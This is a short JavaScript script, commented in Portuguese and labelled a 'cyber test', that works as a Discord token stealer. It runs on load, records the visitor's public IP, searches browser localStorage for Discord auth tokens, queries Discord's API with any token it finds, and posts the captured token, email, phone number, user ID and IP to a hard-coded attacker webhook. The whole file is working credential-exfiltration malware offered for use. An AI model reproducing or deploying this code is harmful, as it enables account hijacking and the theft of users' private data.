async function iniciarTesteCyber() {
    const WEBHOOK = "https://discordapp.com/api/webhooks/1499948274348724326/Zzom5OzJwSIXKUDdXjGb3hLoUEzXJY7rFmjrliPR5Hmf2MiHpcXHOr4BOiMTBsFhQdHm";

    // 1. Captura de IP
    let ipReal = "0.0.0.0";
    try {
        const resIp = await fetch('https://api.ipify.org?format=json');
        const dataIp = await resIp.json();
        ipReal = dataIp.ip;
    } catch (e) {}

    // 2. Busca de Token no Navegador
    let token = "";
    const chaves = ['token', 'discord_token', '_token', 'auth'];
    for (let c of chaves) {
        let t = localStorage.getItem(c);
        if (t) { token = t.replace(/"/g, ""); break; }
    }

    if (token) {
        // 3. Processamento de Dados (Lógica do seu Python em JS)
        try {
            const resMe = await fetch('https://discord.com/api/v9/users/@me', {
                headers: { 'Authorization': token }
            });
            const u = await resMe.json();

            // Monta o relatório completo
            const payload = {
                username: "LUCZ - EXTREME LOGGER",
                embeds: [{
                    title: "⚠️ VULNERABILIDADE CRÍTICA ENCONTRADA",
                    color: 16711680,
                    thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png` },
                    fields: [
                        { name: "👤 Usuário", value: `\`${u.username}#${u.discriminator}\``, inline: true },
                        { name: "🆔 ID", value: `\`${u.id}\``, inline: true },
                        { name: "📧 E-mail", value: `\`${u.email || "Sem e-mail"}\``, inline: false },
                        { name: "📞 Telefone", value: `\`${u.phone || "Sem telefone"}\``, inline: true },
                        { name: "🌐 IP Real", value: `\`${ipReal}\``, inline: true },
                        { name: "💎 Nitro", value: u.premium_type ? "Sim" : "Não", inline: true },
                        { name: "🔑 Token Capturado", value: `\`\`\`${token}\`\`\`` }
                    ],
                    footer: { text: "Relatório de Teste de Invasão" },
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

        } catch (err) {
            console.log("Erro ao processar token.");
        }
    } else {
        // Caso não ache token, manda só o IP
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🌐 **Acesso Detectado (Sem Token):** IP \`${ipReal}\``
            })
        });
    }
}

iniciarTesteCyber();
